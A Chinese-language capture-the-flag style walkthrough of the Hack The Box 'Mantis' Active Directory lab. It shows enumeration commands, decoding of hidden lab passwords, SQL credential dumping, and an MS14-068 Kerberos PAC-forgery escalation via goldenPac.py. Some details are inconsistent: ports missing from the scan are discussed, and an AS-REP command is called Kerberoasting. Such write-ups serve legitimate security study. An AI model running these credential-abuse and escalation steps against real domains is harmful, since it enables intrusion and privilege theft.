## AD-Mantis

### 0x00 前言

本小白最近在学域渗透，决定把Hack The Box的Active Directory 101
系列域渗透靶机打完，并详细记录当中用到的工具、知识点及其背后的原理。本篇文章是该系列的第七篇，靶机名字为Mantis。

### 0x01 信息搜集

首先我们使用nmap来进行端口与服务的发现

    
    
    Nmap scan report for 10.129.100.147
    Host is up (0.019s latency).
    Not shown: 981 closed tcp ports (conn-refused)
    PORT      STATE SERVICE      VERSION
    53/tcp    open  domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
    88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-02-14 11:56:48Z)
    135/tcp   open  msrpc        Microsoft Windows RPC
    139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
    389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
    445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  tcpwrapped
    1433/tcp  open  ms-sql-s     Microsoft SQL Server 2014 12.00.2000
    3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
    3269/tcp  open  tcpwrapped
    8080/tcp  open  http         Microsoft IIS httpd 7.5
    49152/tcp open  msrpc        Microsoft Windows RPC
    49153/tcp open  msrpc        Microsoft Windows RPC
    49154/tcp open  msrpc        Microsoft Windows RPC
    49155/tcp open  msrpc        Microsoft Windows RPC
    49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
    49158/tcp open  msrpc        Microsoft Windows RPC
    Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 61.09 seconds
    

通过以上nmap的扫描结果，我发现了一些可能对进一步渗透有用的端口与服务

  *  **Kerberos (88/TCP)** — Windows Kerberos 协议服务，可用于枚举AD 信息

  *  **LDAP (389/TCP)** — 活动目录 LDAP。LDAP 通常提供有关 AD 的详细信息。而如果允许匿名绑定，我们可以查询到很多好的AD信息，比如用户信息。

  *  **SMB (445/TCP)** — Windows 服务器消息块 (“SMB”) 协议。对于 SMB，最好检查它是否允许空会话。如果允许我们可以枚举许多有用的 AD 信息。

  *  **WinRM (5985/TCP)** — WS-Management 协议的 Microsoft 实现。这可以允许通过 PowerShell 进行远程连接。

  * **RPC（135/RPC）**可用于枚举AD 信息

首先我们来使用kerbrute来枚举用户名

    
    
    ./kerbrute_linux_amd64  userenum --domain htb.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.52
    

![图片.png](https://image.3001.net/images/20221202/1669986551_6389f8f7b7bfc102c7cb8.png!small)

通过访问8080端口的web页面，我们发现web服务使用的是Orchard CMS  
![图片.png](https://image.3001.net/images/20221202/1669986658_6389f9626c9e092719972.png!small)

尝试搜索该CMS的历史漏洞，但是貌似没有什么能getshell的漏洞

![图片.png](https://image.3001.net/images/20221202/1669986707_6389f9938d7d56b53d17d.png!small)

### 0x02 目录爆破发现敏感文件

使用dirsearch对1337和8080端口的web服务进行目录爆破后，在1337端口的web目录发现了如下的两个文件

    
    
    python dirsearch.py -u http://10.10.10.52:1337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -o mantis_dir.txt
    

![图片.png](https://image.3001.net/images/20221202/1669986717_6389f99d9b3d1b2a77a22.png!small)

在该目录发现了两个文件，在web.config文件中看到了如下内容

![图片.png](https://image.3001.net/images/20221202/1669986735_6389f9afd2fb345cc4d4c.png!small)

    
    
    010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001
    
    
    
    perl -lpe '$_=pack"B*",$_' < <( echo 010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001 )
    
    @dm!n_P@ssW0rd!
    

![图片.png](https://image.3001.net/images/20221202/1669986751_6389f9bf04296babe2edc.png!small)

对于 SQL Server，注释是关于文件名的，而且这个里面有一些 base64

    
    
    echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d
    

![图片.png](https://image.3001.net/images/20221202/1669986766_6389f9cea8e0830f9f8a9.png!small)

所有两位十六进制值似乎都属于 ASCII 范围，因此我将尝试使用`xxd`：

    
    
    echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d | xxd -r -p
    
    m$$ql_S@_P@ssW0rd!
    

![图片.png](https://image.3001.net/images/20221202/1669986779_6389f9db5d86e908c627f.png!small)

### 0x03 SQL Server查询

尝试连接

![图片.png](https://image.3001.net/images/20221202/1669986835_6389fa13319264bb420df.png!small)

    
    
    SELECT name FROM master.dbo.sysdatabases;
    USE orcharddb;
    SELECT Username, Password FROM blog_Orchard_Users_UserPartRecord;
    

![图片.png](https://image.3001.net/images/20221202/1669986805_6389f9f549faa15170f7e.png!small)

    
    
    J@m3s_P@ssW0rd!
    

尝试利用james进行信息搜集，但是并无更多的发现

    
    
    crackmapexec smb 10.129.100.147 -u james -p 'J@m3s_P@ssW0rd!' -d htb.local
    smbmap -H 10.10.10.52 -u james -p 'J@m3s_P@ssW0rd!'
    rpcclient -U htb.local/james 10.10.10.52
    

![图片.png](https://image.3001.net/images/20221202/1669986862_6389fa2e9c84394e73b83.png!small)

尝试进行Kerberoasting，但是并没有发现什么可利用的。

    
    
    GetNPUsers.py 'htb.local/james:J@m3s_P@ssW0rd!' -dc-ip 10.10.10.52
    

![图片.png](https://image.3001.net/images/20221202/1669986869_6389fa3563d1c9a08c602.png!small)

### 0x04 MS14-068

MS14-068漏洞利用以 Kerberos为目标，可用于使用域用户权限伪造 Kerberos 票据。

该漏洞的原理详解：

MS14-068补丁编号是KB3011780，域里面最严重的漏洞之一，它允许任意用户提升到域管权限。下面简要分析下该漏洞。

该漏洞最本质的地方在于Microsoft Windows Kerberos
KDC无法正确检查Kerberos票证请求随附的特权属性证书（PAC）中的有效签名，这里面的签名就是上面提到的服务检验和以及KDC校验和。导致用户可以自己构造一张PAC。
签名原本的设计是要用到HMAC系列的checksum算法，也就是必须要有key的参与，我们没有krbtgt的hash以及服务的hash，就没有办法生成有效的签名，但是问题就出在，实现的时候允许所有的checksum算法都可以，包括MD5。那我们只需要把PAC
进行md5，就生成新的校验和。这也就意味着我们可以随意更改PAC的内容，完了之后再用md5
给他生成一个服务检验和以及KDC校验和。在MS14-068修补程序之后，Microsoft添加了一个附加的验证步骤，以确保校验和类型为KRB_CHECKSUM_HMAC_MD5。

在KERB_VALIDATION_INFO结构里面，我们看到有这两个字段：

![图片.png](https://image.3001.net/images/20221202/1669986889_6389fa49dfcd822612334.png!small)

其中GroupId是用户所在所在的组，那只要我们把重要组(比如域管组)的sid加进GroupId。那么服务拿这用户的TGS去询问域管用户是否有访问访问改服务的权限的时候，域控会解密PAC，提取里面用户的sid，以及所在的组(GroupId)，域控会把这个用户当做域管组里面的成员。从而达到提升为域管的效果。

[impacket-goldenPac](https://github.com/SecureAuthCorp/impacket/blob/master/examples/goldenPac.py)可用于自动利用该漏洞。

首先我们需要修改一下hosts文件添加我们前面发现的两个域名

    
    
    vim /etc/hosts
    
    
    
    goldenPac.py -dc-ip 10.10.10.52 -target-ip 10.10.10.52  htb.local/james@mantis.htb.local
    

![图片.png](https://image.3001.net/images/20221202/1669986926_6389fa6e1be5e094d8eaf.png!small)

通过上图可以看到我们已经拿到了系统权限，这台靶机到这里就结束了。

